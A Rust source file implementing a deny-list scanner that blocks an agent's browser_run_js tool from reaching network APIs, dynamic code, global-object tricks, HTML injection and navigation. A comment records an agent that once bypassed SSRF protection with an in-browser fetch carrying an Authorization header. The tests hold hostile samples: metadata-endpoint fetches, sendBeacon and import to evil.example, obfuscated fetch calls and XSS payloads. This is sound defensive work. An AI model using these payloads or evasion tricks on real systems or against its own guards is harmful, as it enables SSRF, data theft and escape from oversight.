//! Static guard for `browser_run_js` expressions.
//!
//! `browser_run_js` exists to read or interact with the DOM of the page the
//! agent navigated to. It must not become a way around `web_fetch`'s SSRF
//! protection: an agent once used `fetch()` with an `Authorization` header
//! from inside the browser to reach a service `web_fetch` would have refused.
//!
//! This is a deny-list scanner over the raw expression text. It is not a JS
//! parser, so it errs on the side of refusing: anything that reaches a network
//! API, evaluates a string as code, reflects over the global object, or hides
//! identifiers behind escapes or string building is refused. False positives
//! cost the agent a retry with plainer code; false negatives cost an SSRF.
//!
//! It is one of two layers. The browser session also intercepts every request
//! the page makes over CDP (`Fetch.requestPaused`) and fails the ones that
//! target private, loopback, link-local or metadata addresses (see
//! `browser.rs`), which also covers requests this scanner cannot see.

/// Global objects whose computed or aliased use is refused. For these the
/// only allowed shape is `window.<name>` member access.
const STRICT_GLOBALS: &[&str] = &["window", "globalThis", "defaultView", "contentWindow"];

/// Words that are the global object in some contexts but ordinary words in
/// others (`rect.top`, `{ top: 0 }`, a `#top` selector). Refused when used as
/// a value or with bracket access.
const AMBIGUOUS_GLOBALS: &[&str] = &["self", "top", "parent", "frames", "opener", "this"];

/// Network APIs. Any word-bounded occurrence is refused.
const NETWORK_WORDS: &[&str] = &[
    "fetch",
    "fetchLater",
    "XMLHttpRequest",
    "XDomainRequest",
    "WebSocket",
    "WebSocketStream",
    "WebTransport",
    "EventSource",
    "sendBeacon",
    "Request",
    "RTCPeerConnection",
    "webkitRTCPeerConnection",
    "Worker",
    "SharedWorker",
    "serviceWorker",
    "importScripts",
    "import",
    "caches",
    "setRequestHeader",
];

/// Constructors that load a URL as soon as `src` is set (`new Image()`).
const LOADING_CONSTRUCTORS: &[&str] = &["Image", "Audio"];

/// Dynamic code evaluation and the usual obfuscation helpers.
const DYNAMIC_CODE_WORDS: &[&str] = &[
    "eval",
    "Function",
    "AsyncFunction",
    "GeneratorFunction",
    "constructor",
    "atob",
    "fromCharCode",
    "fromCodePoint",
    "Reflect",
    "unescape",
    // The remaining standard decoders: an encoded payload is as executable
    // as a plain one, and `unescape` alone does not cover them.
    "decodeuri",
    "textdecoder",
    // execCommand('insertHTML') writes raw markup on legacy paths.
    "execcommand",
];

/// Credential header names, used to make the refusal message specific.
const CREDENTIAL_MARKERS: &[&str] = &[
    "authorization",
    "cookie",
    "x-api-key",
    "api-key",
    "apikey",
    "x-auth-token",
    "bearer ",
    "proxy-authorization",
];

/// Check an expression before it is sent to the browser.
///
/// Returns `Err` with an agent-facing explanation when the expression is
/// refused.
pub fn check_run_js_expression(expr: &str) -> Result<(), String> {
    match find_violation(expr) {
        None => Ok(()),
        Some(reason) => Err(refusal_message(expr, &reason)),
    }
}

fn refusal_message(expr: &str, reason: &str) -> String {
    let lower = expr.to_lowercase();
    let credentials = CREDENTIAL_MARKERS.iter().any(|m| lower.contains(m));
    let mut msg = format!(
        "browser_run_js refused: the expression {reason}. browser_run_js is only for \
         reading or interacting with the current page's DOM. To make HTTP requests use \
         web_fetch, which applies SSRF protection. Write plain DOM code without string \
         building, escapes or global-object tricks."
    );
    if credentials {
        msg.push_str(
            " Credentials (Authorization, Cookie, X-Api-Key headers, tokens) must never be \
             put in agent-written code: they belong in connectors, hands or environment \
             variables, which inject them server-side.",
        );
    } else {
        msg.push_str(
            " Credentials belong in connectors, hands or environment variables, never in \
             agent-written code.",
        );
    }
    msg
}

/// Returns a human-readable reason for the first rule the expression breaks.
fn find_violation(expr: &str) -> Option<String> {
    // 1. Escapes hide identifiers and strings: `fetch`, '\x66etch', '\146'.
    if let Some(esc) = find_escape(expr) {
        return Some(format!("contains the escape sequence `\\{esc}`"));
    }

    // 2. Network APIs.
    for w in NETWORK_WORDS {
        if word_positions(expr, w).next().is_some() {
            return Some(format!("uses the network API `{w}`"));
        }
    }
    for w in LOADING_CONSTRUCTORS {
        for pos in word_positions(expr, w) {
            if prev_word(expr, pos) == "new" {
                return Some(format!("creates `new {w}()`, which loads a URL"));
            }
        }
    }

    // 3. Dynamic code.
    for w in DYNAMIC_CODE_WORDS {
        if word_positions(expr, w).next().is_some() {
            return Some(format!("uses `{w}`, which can run or hide arbitrary code"));
        }
    }
    if let Some(reason) = check_timers(expr) {
        return Some(reason);
    }

    // 4. Global-object reflection and aliasing.
    if let Some(reason) = check_globals(expr) {
        return Some(reason);
    }

    // 5. Computed property names built from strings: x['fe' + 'tch'].
    let compact: String = expr.chars().filter(|c| !is_js_space(*c)).collect();
    let string_bracket = ["['", "[\"", "[`"].iter().any(|p| compact.contains(p));
    if string_bracket && has_string_building(&compact) {
        return Some(
            "builds a property name from strings (bracket access combined with string \
             concatenation)"
                .to_string(),
        );
    }

    // 6. Code injection through HTML.
    if let Some(reason) = check_html_injection(expr, &compact) {
        return Some(reason);
    }

    // 7. Navigation and resource loading (also blocked by the CDP guard, but
    //    refused here so the agent gets a clear answer).
    if let Some(reason) = check_navigation(expr, &compact) {
        return Some(reason);
    }

    None
}

fn is_ident_char(c: char) -> bool {
    c.is_alphanumeric() || c == '_' || c == '$'
}

fn is_js_space(c: char) -> bool {
    c.is_whitespace() || c == '\u{feff}'
}

/// Byte offsets of word-bounded occurrences of `word` in `s`.
fn word_positions<'a>(s: &'a str, word: &'a str) -> impl Iterator<Item = usize> + 'a {
    s.match_indices(word).filter_map(move |(i, _)| {
        let before = s[..i].chars().next_back();
        let after = s[i + word.len()..].chars().next();
        let bounded =
            before.is_none_or(|c| !is_ident_char(c)) && after.is_none_or(|c| !is_ident_char(c));
        bounded.then_some(i)
    })
}

/// First non-space character at or after byte offset `idx`.
fn next_sig(s: &str, idx: usize) -> Option<char> {
    s[idx..].chars().find(|c| !is_js_space(*c))
}

/// Byte offset of the first non-space character at or after `idx`.
fn next_sig_pos(s: &str, idx: usize) -> Option<usize> {
    s[idx..]
        .char_indices()
        .find(|(_, c)| !is_js_space(*c))
        .map(|(i, _)| idx + i)
}

/// Last non-space character before byte offset `idx`.
fn prev_sig(s: &str, idx: usize) -> Option<char> {
    s[..idx].chars().rev().find(|c| !is_js_space(*c))
}

/// Byte offset of the last non-space character before `idx`.
fn prev_sig_pos(s: &str, idx: usize) -> Option<usize> {
    s[..idx]
        .char_indices()
        .rev()
        .find(|(_, c)| !is_js_space(*c))
        .map(|(i, _)| i)
}

/// The identifier that ends right before `idx` (skipping spaces), or "".
fn prev_word(s: &str, idx: usize) -> String {
    let head = s[..idx].trim_end_matches(is_js_space);
    let start = head
        .char_indices()
        .rev()
        .take_while(|(_, c)| is_ident_char(*c))
        .last()
        .map(|(i, _)| i)
        .unwrap_or(head.len());
    head[start..].to_string()
}

/// The identifier before the `.` that precedes `idx`, if any (`window` in
/// `window . self`).
fn ident_before_dot(s: &str, idx: usize) -> Option<String> {
    let dot = prev_sig_pos(s, idx)?;
    if s[dot..].starts_with('.') {
        Some(prev_word(s, dot))
    } else {
        None
    }
}

fn find_escape(s: &str) -> Option<char> {
    let mut chars = s.chars().peekable();
    while let Some(c) = chars.next() {
        if c == '\\' {
            match chars.peek() {
                Some(&n) if n == 'u' || n == 'x' || n == 'U' || n.is_ascii_digit() => {
                    return Some(n);
                }
                // Skip the escaped character: `\\u` is a literal backslash
                // followed by `u`, which only matters if the string is later
                // evaluated, and every evaluation sink is refused separately.
                Some(_) => {
                    chars.next();
                }
                None => {}
            }
        }
    }
    None
}

fn is_global_word(w: &str) -> bool {
    STRICT_GLOBALS.contains(&w) || AMBIGUOUS_GLOBALS.contains(&w)
}

fn check_globals(expr: &str) -> Option<String> {
    for g in STRICT_GLOBALS {
        for pos in word_positions(expr, g) {
            // `foo.window` on an unrelated object is not the global, except
            // for properties that are always a window (defaultView, ...).
            let always_global = *g == "defaultView" || *g == "contentWindow";
            if !always_global {
                if let Some(owner) = ident_before_dot(expr, pos) {
                    if !is_global_word(&owner) {
                        continue;
                    }
                }
            }
            if next_sig(expr, pos + g.len()) != Some('.') {
                return Some(format!(
                    "uses `{g}` other than for plain member access (aliasing, bracket access \
                     or reflection over the global object)"
                ));
            }
        }
    }

    for g in AMBIGUOUS_GLOBALS {
        for pos in word_positions(expr, g) {
            let after = pos + g.len();
            let next = next_sig(expr, after);
            let owner = ident_before_dot(expr, pos);
            match owner {
                // `window.self`, `top.parent`: a global; only `.member` is fine.
                Some(ref o) if is_global_word(o) => {
                    if next != Some('.') {
                        return Some(format!("uses `{o}.{g}` other than for plain member access"));
                    }
                    continue;
                }
                // `rect.top`, `node.parent`: an ordinary property.
                Some(_) => continue,
                None => {}
            }
            if next == Some('[')
                || (next == Some('?') && expr[after..].trim_start().starts_with("?.["))
            {
                return Some(format!("uses bracket access on `{g}`"));
            }
            let prev = prev_sig(expr, pos);
            // Object-literal key: `{ top: 0 }`, `{ left: 0, top: 0 }`.
            if next == Some(':') && matches!(prev, Some('{') | Some(',')) {
                continue;
            }
            let value_prev = matches!(
                prev,
                Some('=' | '(' | ',' | ':' | '?' | '[' | '!' | '|' | '&' | '>' | '+' | '-' | ';')
            ) || prev.is_none();
            let value_keyword = matches!(
                prev_word(expr, pos).as_str(),
                "return" | "yield" | "await" | "in" | "of" | "typeof" | "void" | "delete" | "new"
            );
            let value_next = !matches!(next, Some('.'));
            if (value_prev || value_keyword) && value_next {
                return Some(format!(
                    "uses `{g}` as a value (aliasing or reflection over the global object)"
                ));
            }
        }
    }
    None
}

fn has_string_building(compact: &str) -> bool {
    const MARKERS: &[&str] = &[
        "'+",
        "+'",
        "\"+",
        "+\"",
        "`+",
        "+`",
        "${",
        ".concat(",
        ".join(",
        ".replace(",
        ".replaceAll(",
        ".reverse(",
        ".split(",
        ".slice(",
        ".substr",
        ".repeat(",
        ".at(",
        ".padStart(",
        ".padEnd(",
        "String(",
        ".toString(",
        ".raw",
    ];
    MARKERS.iter().any(|m| compact.contains(m))
}

/// `setTimeout`/`setInterval` evaluate a string first argument as code.
fn check_timers(expr: &str) -> Option<String> {
    let compact: String = expr.chars().filter(|c| !is_js_space(*c)).collect();
    for t in ["setTimeout", "setInterval"] {
        for pos in word_positions(expr, t) {
            let Some(open) = next_sig_pos(expr, pos + t.len()) else {
                continue;
            };
            if !expr[open..].starts_with('(') {
                // Referencing the timer itself (`const t = setTimeout`) is a
                // way to call it later with a string.
                return Some(format!("uses `{t}` indirectly"));
            }
            let arg = expr[open + 1..].trim_start_matches(is_js_space);
            if arg.starts_with('(') || arg.starts_with("function") || arg.starts_with("async") {
                continue;
            }
            // A bare identifier is fine only if it is an arrow-function
            // parameter (`new Promise(r => setTimeout(r, 500))`).
            let ident: String = arg.chars().take_while(|c| is_ident_char(*c)).collect();
            if !ident.is_empty() {
                let is_param = compact.contains(&format!("{ident}=>"))
                    || compact.contains(&format!("{ident})=>"))
                    || is_first_of_param_list(&compact, &ident);
                if is_param && !has_string_building(&compact) {
                    continue;
                }
            }
            return Some(format!(
                "passes something other than a function to `{t}` (a string argument is run as code)"
            ));
        }
    }
    None
}

/// True if `compact` contains `(<ident>,...)=>`, i.e. `ident` is the first
/// parameter of an arrow function such as `(resolve, reject) => ...`.
fn is_first_of_param_list(compact: &str, ident: &str) -> bool {
    let pat = format!("({ident},");
    compact.match_indices(&pat).any(|(i, _)| {
        let rest = &compact[i + pat.len()..];
        rest.find(')')
            .is_some_and(|close| rest[close + 1..].starts_with("=>"))
    })
}

fn check_html_injection(expr: &str, compact: &str) -> Option<String> {
    let lower = expr.to_lowercase();
    let lower_compact = compact.to_lowercase();
    for needle in [
        "<script",
        "javascript:",
        "srcdoc",
        "insertadjacenthtml",
        "createcontextualfragment",
        "document.write",
        "sethtmlunsafe",
        "parsehtmlunsafe",
        "'script'",
        "\"script\"",
        "`script`",
    ] {
        if lower_compact.contains(needle) {
            return Some(format!("injects code through `{needle}`"));
        }
    }
    // Any way of writing to the HTML sinks: `.innerHTML=`, `['innerHTML']=`,
    // `.innerHTML+=` (the `=` of `+=` follows a `+`, which the compacted form
    // still matches as `innerhtml+=`), and object-literal/`Object.assign`
    // forms that name the property.
    for p in [
        "innerhtml=",
        "outerhtml=",
        "'innerhtml':",
        "\"innerhtml\":",
        "'outerhtml':",
        "\"outerhtml\":",
    ] {
        if lower_compact.contains(p) {
            return Some("assigns HTML (`innerHTML`/`outerHTML`), which can run code".into());
        }
    }
    for p in ["setattribute('on", "setattribute(\"on", "setattribute(`on"] {
        if lower_compact.contains(p) {
            return Some("sets an inline event handler attribute".into());
        }
    }
    // Inline handlers inside HTML markup: `<img src=x onerror=...>`.
    let has_markup = lower.char_indices().any(|(i, c)| {
        c == '<'
            && lower[i + 1..]
                .chars()
                .next()
                .is_some_and(|n| n.is_ascii_alphabetic())
    });
    if has_markup {
        for (i, _) in lower.match_indices("on") {
            let before = lower[..i].chars().next_back();
            if before.is_some_and(|c| is_ident_char(c) || c == '.') {
                continue;
            }
            let rest = &lower[i + 2..];
            let name_len = rest.chars().take_while(|c| c.is_ascii_alphabetic()).count();
            if name_len < 3 {
                continue;
            }
            let after = rest[name_len..].trim_start_matches(is_js_space);
            if after.starts_with('=') && !after.starts_with("==") {
                return Some("contains an inline event handler in HTML markup".into());
            }
        }
    }
    None
}

fn check_navigation(expr: &str, compact: &str) -> Option<String> {
    let lower_compact = compact.to_lowercase();
    let assigns = |needle: &str| {
        lower_compact.match_indices(needle).any(|(i, _)| {
            let rest = &lower_compact[i + needle.len()..];
            !rest.starts_with('=')
        })
    };
    for prop in [".src=", ".srcset=", ".href=", ".action=", ".formaction="] {
        if assigns(prop) {
            return Some(format!(
                "assigns `{}`, which makes the browser load a URL",
                prop.trim_end_matches('=')
            ));
        }
    }
    for attr in [
        "src",
        "srcset",
        "href",
        "action",
        "formaction",
        "xlink:href",
        "ping",
    ] {
        for q in ['\'', '"', '`'] {
            if lower_compact.contains(&format!("setattribute({q}{attr}{q}")) {
                return Some(format!("sets the `{attr}` attribute, which loads a URL"));
            }
        }
    }
    for pos in word_positions(expr, "location") {
        let rest: String = expr[pos + "location".len()..]
            .chars()
            .filter(|c| !is_js_space(*c))
            .collect();
        if (rest.starts_with('=') && !rest.starts_with("=="))
            || rest.starts_with(".assign(")
            || rest.starts_with(".replace(")
        {
            return Some("navigates by changing `location`".into());
        }
        if let Some(member) = rest.strip_prefix('.') {
            let name_len = member.chars().take_while(|c| is_ident_char(*c)).count();
            let after = &member[name_len..];
            if after.starts_with('=') && !after.starts_with("==") {
                return Some("navigates by changing `location`".into());
            }
        }
    }
    for pos in word_positions(expr, "open") {
        let global_or_bare = ident_before_dot(expr, pos)
            .as_deref()
            .is_none_or(is_global_word);
        if global_or_bare && next_sig(expr, pos + 4) == Some('(') {
            return Some("opens a new window (`window.open`)".into());
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    fn allowed(expr: &str) {
        if let Err(e) = check_run_js_expression(expr) {
            panic!("expected allowed: {expr}\n  got: {e}");
        }
    }

    fn refused(expr: &str) -> String {
        match check_run_js_expression(expr) {
            Ok(()) => panic!("expected refused: {expr}"),
            Err(e) => e,
        }
    }

    // ── DOM-reading code stays allowed ──────────────────────────────────

    #[test]
    fn allows_plain_dom_reads() {
        allowed("document.title");
        allowed("document.querySelectorAll('a').length");
        allowed("Array.from(document.querySelectorAll('h2')).map(e => e.innerText)");
        allowed("Array.from(document.querySelectorAll('li')).map(e => e.textContent.trim()).join('\\n')");
        allowed("[...document.links].map(a => a.href)");
        allowed("document.querySelector('a').getAttribute('href')");
        allowed("JSON.stringify({ url: location.href, title: document.title })");
        allowed("window.scrollY");
        allowed("window.getComputedStyle(document.body).color");
        allowed("window.innerWidth + 'x' + window.innerHeight");
    }

    #[test]
    fn allows_ordinary_uses_of_ambiguous_words() {
        allowed("document.body.getBoundingClientRect().top");
        allowed("const r = el.getBoundingClientRect(); r.top + r.left");
        allowed("document.querySelector('.top-nav').innerText");
        allowed("document.querySelector('#top') !== null");
        allowed("({ left: 0, top: 10 })");
        allowed("node.parent && node.parent.name");
        allowed("window.top.document.title");
    }

    #[test]
    fn allows_form_filling_and_waiting() {
        allowed("document.querySelector('#email').value = 'a@example.com'; true");
        allowed("document.querySelector('form button').click()");
        allowed("await new Promise(r => setTimeout(r, 500)); document.title");
        allowed("await new Promise((resolve) => setTimeout(resolve, 1000)); 1");
        allowed("setTimeout(() => console.log('x'), 10)");
        allowed("document.body.innerHTML.length");
        allowed("el.innerHTML === ''");
        allowed("location.href");
        allowed("location.href == 'about:blank'");
    }

    // ── Network APIs are refused ────────────────────────────────────────

    #[test]
    fn refuses_fetch_and_friends() {
        refused("fetch('http://169.254.169.254/latest/meta-data/')");
        refused("await fetch('/api').then(r => r.json())");
        refused("window.fetch('https://example.com')");
        refused("fetch   ('x')");
        refused("const x = new XMLHttpRequest(); x.open('GET', '/'); x.send()");
        refused("new WebSocket('ws://127.0.0.1:4200/ws')");
        refused("new EventSource('/events')");
        refused("navigator.sendBeacon('https://evil.example', 'data')");
        refused("import('https://evil.example/x.js')");
        refused("new Request('http://10.0.0.1/')");
        refused("new Image().src = 'http://192.168.1.1/'");
        refused("new Worker('w.js')");
        refused("navigator.serviceWorker.register('/sw.js')");
        refused("caches.open('x')");
    }

    #[test]
    fn refusal_with_auth_header_mentions_credentials() {
        let e = refused(
            "fetch('https://api.github.com/user', { headers: { Authorization: 'token abc' } })",
        );
        assert!(e.contains("web_fetch"), "{e}");
        assert!(
            e.contains("connectors, hands or environment variables"),
            "{e}"
        );
        assert!(e.contains("Authorization, Cookie, X-Api-Key"), "{e}");

        let e = refused("x = new XMLHttpRequest(); x.setRequestHeader('X-Api-Key', k)");
        assert!(e.contains("Authorization, Cookie, X-Api-Key"), "{e}");
    }

    #[test]
    fn plain_refusal_still_points_to_web_fetch() {
        let e = refused("fetch('https://example.com')");
        assert!(e.starts_with("browser_run_js refused"), "{e}");
        assert!(e.contains("web_fetch"), "{e}");
        assert!(e.contains("`fetch`"), "{e}");
    }

    // ── Obfuscation is refused ──────────────────────────────────────────

    #[test]
    fn refuses_bracket_access_on_globals() {
        refused("window['fe'+'tch']('http://127.0.0.1')");
        refused("window['fe' + 'tch']('x')");
        refused("window [ 'fe' + 'tch' ] ('x')");
        refused("window\n  [ 'fetch' ]('x')");
        refused("globalThis[\"fe\"+\"tch\"]('x')");
        refused("self['f' + 'etch']('x')");
        refused("top['fetch']('x')");
        refused("parent[k]('x')");
        refused("frames[0].location");
        refused("this['fe' + 'tch']('x')");
        refused("window?.['fe'+'tch']('x')");
        refused("window.self[k]('x')");
        refused("document.defaultView[k]('x')");
        refused("document.querySelector('iframe').contentWindow[k]()");
    }

    #[test]
    fn refuses_aliasing_the_global_object() {
        refused("const w = window; w[k]('x')");
        refused("const g = globalThis");
        refused("const s = self; s.x");
        refused("var t = top");
        refused("(function(){ return this })()");
        refused("Object.keys(window)");
        refused("Object.getOwnPropertyDescriptor(window, k)");
        refused("const v = window.self;");
        refused("const d = document.defaultView");
        refused("const { ['fe'+'tch']: f } = window; f('x')");
    }

    #[test]
    fn refuses_string_built_property_names_on_any_object() {
        refused("const o = navigator; o['send' + 'Beacon']('x')");
        refused("el['inner' + 'HTML'] = x");
        refused("obj[`fe${'tch'}`]");
        refused("x[['fe','tch'].join('')]");
        refused("x['hctef'.split('').reverse().join('')]");
    }

    #[test]
    fn refuses_escapes() {
        refused("f\\u0065tch('x')");
        refused("window['\\x66etch']('x')");
        refused("'\\146etch'");
        refused("f\\u{65}tch('x')");
    }

    #[test]
    fn refuses_dynamic_code() {
        refused("eval('fe' + 'tch(1)')");
        refused("(0, eval)('this')");
        refused("Function('return fetch')()");
        refused("new Function('a', 'return a')");
        refused("[].constructor.constructor('return this')()");
        refused("atob('ZmV0Y2g=')");
        refused("String.fromCharCode(102, 101)");
        refused("Reflect.get(o, k)");
        refused("unescape('%66etch')");
        refused("setTimeout('fe' + 'tch(1)')");
        refused("setTimeout(\"alert(1)\", 0)");
        refused("setInterval(code, 100)");
        refused("const t = setTimeout; t(code)");
    }

    #[test]
    fn refuses_code_injection_through_html() {
        refused("document.body.innerHTML = '<img src=x onerror=alert(1)>'");
        refused("el.insertAdjacentHTML('beforeend', h)");
        refused("document.write('<p>x</p>')");
        refused("const s = document.createElement('script'); document.body.append(s)");
        refused("a.setAttribute('onclick', code)");
        refused("el.outerHTML = h");
        refused("d.innerHTML = '<div><svg onload = go()></svg></div>'");
        refused("iframe.srcdoc = h");
        refused("a.href = 'javascript:void(0)'");
    }

    #[test]
    fn refuses_navigation_and_resource_loading() {
        refused("location.href = 'http://127.0.0.1:4200/'");
        refused("location = 'http://10.0.0.1'");
        refused("window.location.assign('http://169.254.169.254')");
        refused("document.location.replace('x')");
        refused("img.src = 'http://192.168.0.1/x.png'");
        refused("form.action = 'http://10.0.0.1'; form.submit()");
        refused("el.setAttribute('src', u)");
        refused("window.open('http://127.0.0.1')");
        refused("open('http://127.0.0.1')");
    }
}
